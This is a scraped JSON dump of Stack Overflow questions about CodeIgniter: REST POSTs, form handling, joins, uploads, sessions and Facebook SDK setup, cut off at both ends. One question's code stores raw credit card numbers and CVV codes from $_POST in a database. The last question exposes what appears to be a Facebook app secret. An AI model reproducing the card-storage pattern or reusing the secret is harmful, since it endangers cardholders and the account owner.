string(10) \"developers\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [31]=&gt;\n  object(stdClass)#81 (6) {\n    [\"id\"]=&gt;\n    string(2) \"54\"\n    [\"name\"]=&gt;\n    string(7) \"dropbox\"\n    [\"url\"]=&gt;\n    string(11) \"dropbox.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"do\"\n    [\"category\"]=&gt;\n    string(4) \"apps\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [32]=&gt;\n  object(stdClass)#82 (6) {\n    [\"id\"]=&gt;\n    string(2) \"59\"\n    [\"name\"]=&gt;\n    string(5) \"skype\"\n    [\"url\"]=&gt;\n    string(9) \"skype.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"sk\"\n    [\"category\"]=&gt;\n    string(4) \"apps\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [33]=&gt;\n  object(stdClass)#83 (6) {\n    [\"id\"]=&gt;\n    string(2) \"72\"\n    [\"name\"]=&gt;\n    string(10) \"googletalk\"\n    [\"url\"]=&gt;\n    string(10) \"google.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"gk\"\n    [\"category\"]=&gt;\n    string(4) \"apps\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [34]=&gt;\n  object(stdClass)#84 (6) {\n    [\"id\"]=&gt;\n    string(2) \"81\"\n    [\"name\"]=&gt;\n    string(10) \"googleplay\"\n    [\"url\"]=&gt;\n    string(15) \"play.google.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"gp\"\n    [\"category\"]=&gt;\n    string(4) \"apps\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [35]=&gt;\n  object(stdClass)#85 (6) {\n    [\"id\"]=&gt;\n    string(2) \"82\"\n    [\"name\"]=&gt;\n    string(11) \"googledrive\"\n    [\"url\"]=&gt;\n    string(16) \"drive.google.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"gd\"\n    [\"category\"]=&gt;\n    string(4) \"apps\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [36]=&gt;\n  object(stdClass)#86 (6) {\n    [\"id\"]=&gt;\n    string(2) \"84\"\n    [\"name\"]=&gt;\n    string(6) \"ubuntu\"\n    [\"url\"]=&gt;\n    string(10) \"ubuntu.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"ub\"\n    [\"category\"]=&gt;\n    string(4) \"apps\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [37]=&gt;\n  object(stdClass)#87 (6) {\n    [\"id\"]=&gt;\n    string(2) \"89\"\n    [\"name\"]=&gt;\n    string(14) \"ifthisthenthat\"\n    [\"url\"]=&gt;\n    string(9) \"ifttt.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"if\"\n    [\"category\"]=&gt;\n    string(4) \"apps\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [38]=&gt;\n  object(stdClass)#88 (6) {\n    [\"id\"]=&gt;\n    string(2) \"29\"\n    [\"name\"]=&gt;\n    string(6) \"custom\"\n    [\"url\"]=&gt;\n    string(0) \"\"\n    [\"shortname\"]=&gt;\n    string(3) \"...\"\n    [\"category\"]=&gt;\n    NULL\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n}\n</code></pre>\n\n<p>i need to group items by category key </p>\n"},{"tags":["json","codeigniter","rest","post","curl"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":81,"score":2,"question_id":12731681,"title":"Why am I unable to access the json data POST'd to my codeigniter application?","body":"<p>I'm working on a RESTful application using CodeIgniter and I'm unable to access my POST'd json data in my controller.</p>\n\n<p>I'm posting the json via cURL on my local machine, while the app is being developed on a remote server.</p>\n\n<p>Here is the controller code in question:</p>\n\n<pre><code>class Products extends CI_Controller\n{\n  public function __construct()\n  {\n    $this-&gt;load-&gt;model(products_model);\n  }\n  public function index($id = FALSE)\n  {\n    if($_SERVER['REQUEST_METHOD'] == 'GET')\n    {\n      // fetch product data\n      $product_data = $this-&gt;products_model-&gt;get_products($id)\n\n      // set appropriate header, output json\n      $this-&gt;output\n        -&gt;set_content_type(application/json)\n        -&gt;set_output(json_encode($product_data));\n    }\n    elseif($_SERVER['REQUEST_METHOD'] == 'POST')\n    {\n      // debugging for now, just dump the post data\n      var_dump($this-&gt;input-&gt;post());\n    }\n\n  }\n}\n</code></pre>\n\n<p>The GET action is working well enough, and returning the appropriate data when requested from a browser, or via a cURL request.  However, when attempting to POST json data via cURL I consistently get <code>bool(FALSE)</code> returned from the POST section of the index function.  Here is the cURL request I'm making:</p>\n\n<pre><code>curl -X POST -d @product.json mydomain.com/restfulservice/products\n</code></pre>\n\n<p>Also, here is the contents of the product.json file:</p>\n\n<pre><code>{\"id\":\"240\",\n\"name\":\"4 x 6 Print\",\n\"cost\":\"1.5900\",\n\"minResolution\":401,\n\"unitOfMeasure\":\"in\",\n\"dimX\":0,\n\"dimY\":0,\n\"height\":4,\n\"width\":6}\n</code></pre>\n\n<p>I've made another POST via cURL, excluding the json data and passing something like this:</p>\n\n<pre><code>curl -X POST -d '&amp;this=that' mydomain.com/restfulservice/products\n</code></pre>\n\n<p>Which returns</p>\n\n<pre><code>array(1) {\n  [\"this\"]=&gt;\n  string(4) \"that\"\n}\n</code></pre>\n\n<p>What gives?  Something with the json?  It's valid.  I've turned off the global CSRF and XSS in application/config/config.php as I understand they require use of CI's <code>form_open()</code> and won't work properly without it.  It's my understanding that excluding parameters from <code>$this-&gt;input-&gt;post()</code> will return ALL the post items yet I continue to get none.  I've also tried going around CI's input library and accessing the data via PHP's <code>$_POST</code> variable, it has made no difference.</p>\n"},{"tags":["php","codeigniter","input"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12734801,"title":"Processing multiple input fields with codeigniter?","body":"<p>The problem I am having is that my ecommerce script allows people to add products to their store. However, those products can have variants... like Color and those variants can have options, like Black, White, and Blue for example. The problem I am having is how exactly do I determine how many options they have entered. Eventually I will have a javascript function add a new input field if they click \"add option\" but for now I just made 3 input fields like so:</p>\n\n<pre><code>Variant Title:&lt;input type=\"text\" name=\"variant_title\"&gt;&lt;br&gt;\nVariant Option: &lt;input type=\"text\" name=\"variant_option_1\"&gt;&lt;br&gt;\nVariant Option: &lt;input type=\"text\" name=\"variant_option_2\"&gt;&lt;br&gt;\nVariant Option: &lt;input type=\"text\" name=\"variant_option_3\"&gt;&lt;br&gt;\n</code></pre>\n\n<p>Now what I don't know how to do is loop through all the variant_options and if they are not empty add them to a database. I don't want to hard code it in with the names because I don't know how many options they will choose per variant.</p>\n\n<p>I tried doing this:</p>\n\n<pre><code>$i = 1;\n            while($this-&gt;input-&gt;post('variant_option_$i') != '')\n            {\n                $variant_options[] = $this-&gt;post-&gt;input('variant_option_$i');\n                $i++;\n            }\n</code></pre>\n\n<p>But that does not seem to work, as the variant title gets added to the database, however the options do not.</p>\n\n<p>The only thing I need a solution to is to how to actually grab those fields all at once. I was thinking a foreach loop but im not sure.</p>\n\n<p>Thank you.</p>\n"},{"tags":["php","codeigniter","paypal"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12732504,"title":"Paypal SetExpressCheckout requires DoExpressCheckout?","body":"<p>I have finished the workflow for SetExpressCheckout but I see 2 other API's: GetExpressCheckoutDetails and DoExpressCheckoutPayment. I don't want to call 2 extra url's - I want direct payment. Is calling SetExpressCheckout sufficient for ordering online transactions?</p>\n"},{"tags":["php","oop","mvc","codeigniter"],"answer_count":2,"favorite_count":1,"up_vote_count":8,"down_vote_count":0,"view_count":1063,"score":8,"question_id":3113407,"title":"Codeigniter: when to use a model vs library?","body":"<p>I've starting using Codeigniter for a project recently (few months ago) but its getting a little out of hand with a bunch of models that need to interact with each other and I was wondering if I should be creating a library instead?</p>\n\n<p>In my case, I have a user action that happens when you win a game and it would get logged in  my user_model but I also want it to get put in my events_model?</p>\n\n<p>Should something like this that affects multiple models become a library? </p>\n\n<p>I know it should NOT be in the controller because I'd have to reuse this trigger in multiple controllers (might not make sense for the provided example but does for my application).</p>\n"},{"tags":["php","forms","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":42,"score":0,"question_id":12732082,"title":"Codeigniter update form not retrieving dropdown values","body":"<p>I'm fairly new to CI.  I have a customer database which stores a bunch of customer information.  I have also created an Update controller to update current customer information.  The update form is the same form as the new customer form but for the value I've got it pulling the old data from the database.  My problem is it pulls all the data and displays it in it's propor field except the drop down field.  Any ideas how to fix this?</p>\n\n<p>CONTROLLER:</p>\n\n<pre><code>function edit_customer($id){\n    $data['success']=0;\n    if($_POST){\n        $data_customer=array(\n            'first_name'=&gt;$_POST['first_name'],\n            'last_name'=&gt;$_POST['last_name'],\n            'phone'=&gt;$_POST['phone'],\n            'email'=&gt;$_POST['email'],\n            'website'=&gt;$_POST['website'],\n            'business_name'=&gt;$_POST['business_name'],\n            'business_add'=&gt;$_POST['business_add'],\n            'business_cityState'=&gt;$_POST['business_cityState'],\n            'cc_type'=&gt;$_POST['cc_type'],\n            'cc_number'=&gt;$_POST['cc_number'],\n            'cc_exp'=&gt;$_POST['cc_exp'],\n            'cc_cvd'=&gt;$_POST['cc_cvd'],\n            'billing_add'=&gt;$_POST['billing_add'],\n            'billing_zip'=&gt;$_POST['billing_zip'],\n            'package'=&gt;$_POST['package'],\n            'assigned_zip_code'=&gt;$_POST['assigned_zip_code'],\n            'active'=&gt;1\n        );\n        $data_customer['active'] = 1;\n        $this-&gt;customer-&gt;update_customer($id,$data_customer);\n        $data['success']=1;\n    }\n    $data['customer']=$this-&gt;customer-&gt;get_customer($id);\n\n    $this-&gt;load-&gt;view('header');\n    $this-&gt;load-&gt;view('edit_customer',$data);\n    $this-&gt;load-&gt;view('footer');\n\n}\n</code></pre>\n\n<p>MODEL:</p>\n\n<pre><code>function update_customer($id, $data_customer){\n    $this-&gt;db-&gt;where('id', $id);\n    $this-&gt;db-&gt;update('customers', $data_customer);\n}\n</code></pre>\n\n<p>VIEW DROPDOWN:</p>\n\n<pre><code>&lt;label for=\"cc_type\"&gt;Credit Card Type:&lt;/label&gt;\n                &lt;select name=\"cc_type\" value=\"&lt;?=$customer['cc_type'] ?&gt;\"&gt;\n                  &lt;option&gt;&lt;/option&gt;\n                  &lt;option&gt;Visa&lt;/option&gt;\n                  &lt;option&gt;Mastercard&lt;/option&gt;\n                  &lt;option&gt;American Express&lt;/option&gt;\n                  &lt;option&gt;Discover&lt;/option&gt;\n                &lt;/select&gt;\n</code></pre>\n"},{"tags":["php",".htaccess","codeigniter","session","cookies"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12730910,"title":".htaccess causing session/cookie issues in chrome","body":"<p>Ok guy's i've had a problem that I've been obsessing over for days and still can't find a solution. basically what is happening is.. I'm using the CodeIgniter framework and when I use .htaccess to remove the index.php from the bootstrap, Only in chrome does the session not set. It works fine everywhere else. If I do it without the .htaccess, just using say mysite.com/index.php/controller it works fine.</p>\n\n<p>I'm so stumped and tried so many different solutions/fixes etc. and nothing. I can't find anyone else at all with this issue. Any help would be greatly appreciated!</p>\n"},{"tags":["facebook","codeigniter","twitter","combine"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12730805,"title":"How to combine Twitter and Facebook Post and Sort them by Time in PHP?","body":"<p>How do I combine two different datas from Facebook and Twitter. And sort them by created_time in PHP??</p>\n\n<p>Supposedly I already got the two datas from their respective API calls. But I can't seem to figure out how to combine them and sort them properly.</p>\n\n<p>Example :</p>\n\n<pre><code>FB[1] TW[1]\nFB[2] TW[2]\nFB[3] TW[3]\n</code></pre>\n\n<p>If FB[1]'s created_time is much earlier than of TW[1], then FB[1] is ahead of TW[1].\nIf FB[2]'s created_time is later than of TW[2], then FB[2] is behind of TW[1].\nIf FB[3]'s created_time is the same as of TW[3], then the post would be from FB first then TW.</p>\n\n<p>I got this pseudocode stuck in my head, I just can't figure out how to sort it.</p>\n\n<p>I need this for my project. Please Help.</p>\n\n<p>EDIT: I am using CodeIgniter.. :)</p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12721150,"title":"Codeigniter equivalent of this mysql query","body":"<p>I am trying to get a grasp on the CI database helper/class/lib. And the core basics I can do no problem. But I am so used to straight writing of queries rather than using ORM's that its a little confusing. Anyway..</p>\n\n<p>I Have this query</p>\n\n<pre><code>SELECT * FROM my_table \n  WHERE ((a_id = xx OR b_id = xx) AND (a_id = zz OR b_id = zz)) \n  AND active = 1\n</code></pre>\n\n<p>Basically I have a table where I have 2 users associated with one another, but multiple users so I need to make sure the connection is there and specifically between the 2 where the active flag is what it is. </p>\n\n<p>However Not sure how to handle that query in CI's ORM so I am seeking some guidance on the issue.</p>\n"},{"tags":["php","codeigniter","expressionengine"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12642276,"title":"Expression Engine 2 Output Channel Field Title","body":"<p>Hi I am looping through a channel in EE2 and I am outputting all of the fields values but how do I output the fields title that I labeled it in the backend?</p>\n\n<p><strong>CODE:</strong></p>\n\n<pre><code>&lt;!-- Loop to out put a field called Location --&gt;\n\n{exp:channel:entries channel=\"vacancies\"  disable=\"pagination|member_data|categories\"}\n    &lt;p&gt;{vacancy_location}{title}{/vacancy_location}: {vacancy_location}&lt;/p&gt;\n{/exp:channel:entries}\n</code></pre>\n\n<p><strong>DESIRED OUTPUT:</strong></p>\n\n<pre><code>&lt;p&gt;Location: Some Location&lt;/p&gt;\n</code></pre>\n"},{"tags":["codeigniter","join","many-to-many"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12726818,"title":"Codeigniter 5 joins too normalized?","body":"<p>I am building a rather large CodeIgniter application, \nand started off by normalizing the datbase as good as possible.</p>\n\n<p>Let me start that the website is not responding slow or any problems occur.\nJust wondering what your opinion is on many joins?</p>\n\n<pre><code>$this -&gt; db -&gt; join('A', 'B.user_id = A.id', 'left');\n$this -&gt; db -&gt; join('C', 'A.id = C.user_id', 'left');\n$this -&gt; db -&gt; join('D', 'B.project_id = D.id', 'left');\n$this -&gt; db -&gt; join('E', 'E.client_id = C.id', 'left');\n</code></pre>\n\n<p>As you can see this will call to 5 tables only in the join query.\nIt is much needed to get every detail of the application data and 3 tables are just linking tables.</p>\n\n<p>Could i have jour honest onion on such joins? </p>\n\n<p>Note: I will need to distinct tables, but i'm waiting on that until everything else is code optimized</p>\n\n<p>Regards,\nChris</p>\n"},{"tags":["mysql","sql","codeigniter","search"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":161,"score":1,"question_id":6760335,"title":"Mysql search, order according to priority","body":"<p>I decided that I wanted a search field on my website, the thing is I don't really have any knowledge about search algorithms. The search box works like you can enter any number of names(username, firstname, lastname) or emails separating each by a space. So I came up with the following using codeigniter's active record class (it's very simple):</p>\n\n<pre><code>    $emails = FALSE;\n    $names = FALSE;\n\n    foreach($search_array as $value){\n        if(valid_email($value)){\n            $emails[] = $value;\n        } else{\n            $names[] = $value;\n        }\n    }\n\n    if($emails){\n        $this-&gt;db-&gt;where_in('email', $emails);\n        if($names){\n            $this-&gt;db-&gt;or_where_in('username', $names);\n            $this-&gt;db-&gt;or_where_in('firstname', $names);\n            $this-&gt;db-&gt;or_where_in('lastname', $names);\n        }\n    } else{\n        if($names){\n            $this-&gt;db-&gt;where_in('username', $names);\n            $this-&gt;db-&gt;or_where_in('firstname', $names);\n            $this-&gt;db-&gt;or_where_in('lastname', $names);\n        }\n    }\n\n    $this-&gt;db-&gt;select('id, username, firstname, lastname');\n    $query = $this-&gt;db-&gt;get('users');\n\n    if($query-&gt;num_rows() &gt; 0){\n        return $query-&gt;result();            \n    }\n\n    return FALSE;\n</code></pre>\n\n<p>What this code does is running a bunch of where statements and then simply sending it all back. \nPerhaps I could clean up the if-statements and how the email works, but that's not the point. This code works perfectly (at least with a very small database :P) but I want it to do more:</p>\n\n<ul>\n<li><p>Right now you need to enter the correct name or email to get any good result. If your almost right it would be nice to get some suggestions but that I probably can figure that out by myself doing some LIKE.</p></li>\n<li><p>I want to sort the whole result array, and here is where I'm stumbling. Since both the email and the username is unique I want a search to display using the following priorities:</p>\n\n<ol>\n<li>Email</li>\n<li>Username</li>\n<li>Firstname + Lastname</li>\n<li>Firstname</li>\n<li>Lastname</li>\n</ol></li>\n</ul>\n\n<p>Well for the time being I don't really care about for example Email+username+firstname+lastname since I believe that would be way to overwhelming :P</p>\n\n<p>I did found this topic <a href=\"http://stackoverflow.com/questions/2260909/search-query-order-by-priority\">Search query, &#39;order by&#39; priority</a> but since I don't know which is what in my search it didn't really help me but perhaps I could use something similar?</p>\n\n<p>Anyway you guys know a way to solve the priority problem? Have I perhaps missed some major functions that could help? And what will happen when my database goes big? ;)</p>\n\n<p>Thanks for all help!</p>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12728204,"title":"CodeIgniter doesn't see file input","body":"<p>have this view:</p>\n\n<pre><code>&lt;ul&gt;\n        &lt;li class=\"selectAv\"&gt;\n            &lt;label class=\"grid_4 alpha\"&gt;&amp;nbsp;&lt;/label&gt;\n            &lt;input type=\"file\" id=\"avatar\" name=\"avatar\" class=\"grid_8 omega\"&gt;\n        &lt;/li&gt;\n    &lt;/ul&gt;\n</code></pre>\n\n<p>It's a mutipart form in CI. I want it to use <code>avatar</code> input for file uploads. I did define upload in my model, but <code>$this-&gt;input-&gt;post('avatar')</code> is always empty. Using <code>print_r($this-&gt;input-&gt;post());</code> also doesn't show any sign of <code>avatar</code>.</p>\n\n<p>What I did wrong?</p>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1521,"score":0,"question_id":4423997,"title":"Codeigniter MVC Sample Code","body":"<p>Hi\nI am following the getting started guide for Codeigniterr given at <a href=\"http://www.ibm.com/developerworks/web/library/wa-codeigniter/\" rel=\"nofollow\">http://www.ibm.com/developerworks/web/library/wa-codeigniter/</a> </p>\n\n<p>I have followed the instruction to create the front view and added controller to handle form submission. Ideally, when i submit the form, it should load the model class and execute the function to put details on the database, but instead it is just printing out the code of the model in the browser. </p>\n\n<pre><code>**Code of view (Welcome.php)**\n----------------\n&lt;?php\n\nclass Welcome extends Controller {\n\n function Welcome()\n {\n  parent::Controller(); \n }\n\n function index()\n {\n\n    $this-&gt;load-&gt;helper('form');\n    $data['title'] = \"Welcome to our Site\";\n    $data['headline'] = \"Welcome!\";\n    $data['include'] = 'home';\n    $this-&gt;load-&gt;vars($data);\n    $this-&gt;load-&gt;view('template');\n\n }\n function contactus(){\n  $this-&gt;load-&gt;helper('url');\n  $this-&gt;load-&gt;model('mcontacts','',TRUE);\n  $this-&gt;mcontacts-&gt;addContact();\n  redirect('welcome/thankyou','refresh');\n}\n\n\nfunction thankyou(){\n  $data['title'] = \"Thank You!\";\n  $data['headline'] = \"Thanks!\";\n  $data['include'] = 'thanks';\n  $this-&gt;load-&gt;vars($data);\n  $this-&gt;load-&gt;view('template');\n}\n\n\n\n}\n\n/* End of file welcome.php */\n/* Location: ./system/application/controllers/welcome.php */\n\n**Code of Model** \n--------------\nclass mcontacts extends Model{\n\n  function mcontacts(){\n    parent::Model();\n  }\n}\n\nfunction addContact(){\n  $now = date(\"Y-m-d H:i:s\");\n  $data = array( \n    'name' =&gt; $this-&gt;input-&gt;xss_clean($this-&gt;input-&gt;post('name')),\n    'email' =&gt; $this-&gt;input-&gt;xss_clean($this-&gt;input-&gt;post('email')),\n    'notes' =&gt; $this-&gt;input-&gt;xss_clean($this-&gt;input-&gt;post('notes')),\n    'ipaddress' =&gt; $this-&gt;input-&gt;ip_address(),\n    'stamp' =&gt; $now\n  );\n\n  $this-&gt;db-&gt;insert('contacts', $data);\n }\n\n**OUTPUT after clicking submit** \n-----------------------------\nclass mcontacts extends Model{ function mcontacts(){ parent::Model(); } } function addContact(){ $now = date(\"Y-m-d H:i:s\"); $data = array( 'name' =&gt; $this-&gt;input-&gt;xss_clean($this-&gt;input-&gt;post('name')), 'email' =&gt; $this-&gt;input-&gt;xss_clean($this-&gt;input-&gt;post('email')), 'notes' =&gt; $this-&gt;input-&gt;xss_clean($this-&gt;input-&gt;post('notes')), 'ipaddress' =&gt; $this-&gt;input-&gt;ip_address(), 'stamp' =&gt; $now ); $this-&gt;db-&gt;insert('contacts', $data); } \n</code></pre>\n\n<p>I have tried doing these things\n1. Making all PHP codes executable\n2. Change ownership of files to www-data\n3. make permission 777 for whole of www</p>\n\n<p>But, the code of model seems to be just printed ... PLEASE HELP</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":42,"score":-1,"question_id":12723483,"title":"Jquery updated Select is not posted with the form ? PHP","body":"<p>I'm building a web site that have books and chapters for every book .</p>\n\n<p>Now I wrote a form at which you put a text and choose the book that this text belongs to ,</p>\n\n<p>I made a jquery to see what is the selected book and retrieve the relavent chapters in a select and options form .. and it do this perfectly </p>\n\n<p>but when posting the form i receive every thing but not the value of the select</p>\n\n<p>any help with this ?</p>\n\n<p>by the way i use codeigniter framework</p>\n"},{"tags":["php","mysql","codeigniter","treeview","binary-tree"],"answer_count":2,"favorite_count":0,"up_vote_count":5,"down_vote_count":2,"view_count":968,"score":3,"question_id":9775720,"title":"Binary Tree Using PHP + MySQL","body":"<p>I am implementing an MLM tree for a website using PHP (CodeIgniter) and MySQL. I need a binary tree implementation in the database. The followings things are to be considered: </p>\n\n<ol>\n<li><p>For each node , Minimum of the number of children/nodes in left subtree and the number of children/nodes in right subtree is called a pair. For each pair one nodes gets 1 point - which should be stored in database (nodes represent users)</p></li>\n<li><p>When a new node is created (wherever), it is possible that many of the nodes' pair is incremented. So whenever a node is created, every node's point should be updated(incremented by one when applicable)</p></li>\n<li><p>another constraint is each day any node can not have more than 100 points.</p></li>\n<li><p>I also need to construct (display in a webpage) the tree. Only 4-5 levels are to be shown.</p></li>\n<li><p>The database is likely to have 100000 nodes</p></li>\n</ol>\n\n<p>I have found mainly 4 models for implemmenting hieararchical data in MySQL,PHP</p>\n\n<ol>\n<li>Adjacency list </li>\n<li>Path enumeration </li>\n<li>Nested sets </li>\n<li>Closure table</li>\n</ol>\n\n<p>So I would like to find a solution that will reduce the insertion overhead and successfully update the points for all nodes applicable.</p>\n\n<p>I have tried the adjacency List solution. </p>\n\n<pre><code>node ( id, parentid, leftChildId,rightChildId,leftCount,rightCount ) \nuserStat(id,sdate,pairs,mlmIncome)\n</code></pre>\n\n<p>each time one node is inserted,I go upward and keep incrementing the child counts .If new pair is made then I increment that also and increment the point..\nI am doing these with stored procedures.</p>\n\n<p>The reason why i chose this solution over Nested Set is :\nfor each node inserted , the number of nodes to be updated for Nested Set Is always more than adjacency list.</p>\n\n<p>Though the rate of constructing tree is more than insertion . And nested set is better in constructing trees..  </p>\n\n<p>Am i in the right direction?? Please help !</p>\n\n<p>Thnx in Advance!</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":31,"score":-2,"question_id":12726267,"title":"PHP Time According to System Time using different timezones","body":"<blockquote>\n  <p>my application is running on different timezones area .so the server\n  time is appear different in each timezone. so acording to the time\n  zone the varriable should be take a curent time of that zone</p>\n</blockquote>\n"},{"tags":["codeigniter","soap"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":189,"score":0,"question_id":11573888,"title":"SOAP web service to call a Code Igniter function from the soap server file","body":"<p>I have made a SOAP API in core PHP and placed it in the root folder, and the site is developed in Code Igniter.</p>\n\n<p>Now I want to call a function developed in a controller file of the CI framework, from the SOAP Server file which is not a part of CI. It is in fact developed in core PHP.</p>\n\n<p>Is there any way to call that CI function from the CORE php SOAP server file which is placed in the root folder of the project and not a part of CI framework?</p>\n"},{"tags":["php","codeigniter","session"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12725386,"title":"Fatal error: Call to undefined method CI_Session::sess_destroy() 1.7.2","body":"<p>My current version of ci is 1.7.2 but ehen i am using </p>\n\n<pre><code>            $this-&gt;session-&gt;unset_userdata('uid');\n            $this-&gt;session-&gt;unset_userdata('email');\n            $this-&gt;session-&gt;sess_destroy();\n</code></pre>\n\n<p>in my controller an below shown is my class controller</p>\n\n<pre><code>      function Account()\n{\n    parent::BEV_Controller();   \n    $this-&gt;load-&gt;model('facebook_model');\n    $this-&gt;load-&gt;library('session');\n    $this-&gt;form_validation-&gt;set_error_delimiters('&lt;div class=\"error\"&gt;', '&lt;/div&gt;');\n}\n</code></pre>\n"},{"tags":["php","codeigniter","html-entities"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12725240,"title":"Issue saving &#8539; htmlentity to a database (PHP/MySQL)","body":"<p>I have a script that i'd like to save the value selected from a dropdown menu - one of the options is the following htmlentity</p>\n\n<pre><code>&amp;#8539; // will appear as 1/8\n</code></pre>\n\n<p>But when this is saved to the database it is saved as a question mark? Whats the best method to save htmlentities to the database?</p>\n"},{"tags":["php",".htaccess","codeigniter","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12312519,"title":".htaccess issue to rewrite url for codeigniter","body":"<p>i am using codeigniter in my project.\ni have a url like <a href=\"https://www.domain.com/user/orderplace/any_number\" rel=\"nofollow\">https://www.domain.com/user/orderplace/any_number</a></p>\n\n<p>i was trying to use htaccess rewrite so that if anyone hits my site with https other than above url then redirect to http://</p>\n\n<p>i was trying</p>\n\n<pre><code>RewriteCond %{HTTPS} on\nRewriteCond %{REQUEST_URI} !^user/orderplace/(.*)$\nRewriteRule ^(.*)$ http://www.example.com/$1 [R=301,L]\n</code></pre>\n\n<p>but its not working, i guess following line is not correct for my specified url\n    RewriteCond %{REQUEST_URI} !^user/orderplace/(.*)$</p>\n\n<p>can anyone help me in this issue?</p>\n"},{"tags":["php","codeigniter","frameworks","configuration-files"],"answer_count":5,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":1355,"score":2,"question_id":4394202,"title":"codeigniter: access config variables from other config files?","body":"<p>I have two config files.</p>\n\n<p>config.php (code igniters core config)</p>\n\n<p>and email.php (autoloaded by the email class when it is used)</p>\n\n<p>What i am wanting to do is.</p>\n\n<p>In config.php have</p>\n\n<p><code>$config['env'] = 'hailwood_dev';</code></p>\n\n<p>then in email.php have</p>\n\n<pre><code>if($config['env'] == 'hailwood_dev'){\n//email variables like smtp server to do with localhost\n} elseif($config['env'] == 'production'){\n//email variables like smtp server to do with production\n}\n</code></pre>\n\n<p>But this is not having any effect (im guessing as $config['env'] does not have those values).</p>\n\n<p>How can I access this value?</p>\n"},{"tags":["php","codeigniter","file-upload","mp4","3gp"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":877,"score":0,"question_id":6939895,"title":"codeigniter upload 3gp or mp4 files doesnt work","body":"<p>hi I am trying to upload 3gp and mp4 files on code igniter and it doesnt work</p>\n\n<p>the mpg files are uploaded fine using the same code could anyone help me with that I will really appreciate that</p>\n\n<p>Here is the code i am using </p>\n\n<pre><code>            $config = array(\n\n               'allowed_types' =&gt; 'mp4|mp4|3gp|mpg';\n               'file_name'     =&gt; 'video',\n               'max_size'      =&gt; 1000,\n               'upload_path'   =&gt; realpath(APPPATH.'../user_uploads/'),\n                            );\n\n            $this-&gt;load-&gt;library('upload',$config);\n\n            $this-&gt;upload-&gt;do_upload();\n\n\n            $user_upload = $this-&gt;upload-&gt;data();\n</code></pre>\n"},{"tags":["codeigniter","rest","backbone.js"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":336,"score":3,"question_id":9425849,"title":"Database interaction with codeigniter and backbone.js","body":"<p>I am trying to learn backbone.js to make a web application.This is my first time with a javascript framework and I am fairly confused with some of the stuff.</p>\n\n<p>I have been developing in codeigniter for a while so I do have a understanding of the MVC architecture.</p>\n\n<p>My question is how do I get the data from the backbone.js front end to my codeigniter controller and save it in the database. for example to implement a simple login/register functionality with CI and backbone, how should I proceed. If anyone can guide me step step then that would be great or point me to the right resource. Thank you.</p>\n\n<p>PS: I know that I have to implement a REST api with my codeigniter but I don't know how? so if someone can provide a basic controller example it'd be really helpful.</p>\n"},{"tags":["facebook","codeigniter","sdk"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12717048,"title":"CodeIgniter and Facebook Connect","body":"<p>I am trying to integrate my Codeigniter website with the Facebook PHP SDK.  What I want to do is let a user share an article from my site on their facebook wall, if they are logged into a facebook account.  My library appears to load correctly, but everytime I try to do something, I get some kind of error... primarily with the auth.  getUser does not appear to return the correct results.  I set up my facebook application and set the config vars for my library, but no luck.  It says I am not logged into facebook.  When I click on the \"login\" anchor, the link takes me to the same page, but with the facebook url, and doesn't ask me to login with the app.  Here's my code:</p>\n\n<p><code></p>\n\n<p>function facebook($article_id){</p>\n\n<pre><code>$config = array(\n    'appId' =&gt; '276870792431073',\n    'secret' =&gt; '8d49eee575413fb9a8063d22f65dbf6a'\n);\n\n$this-&gt;load-&gt;library('facebook', $config);\n\n$user = 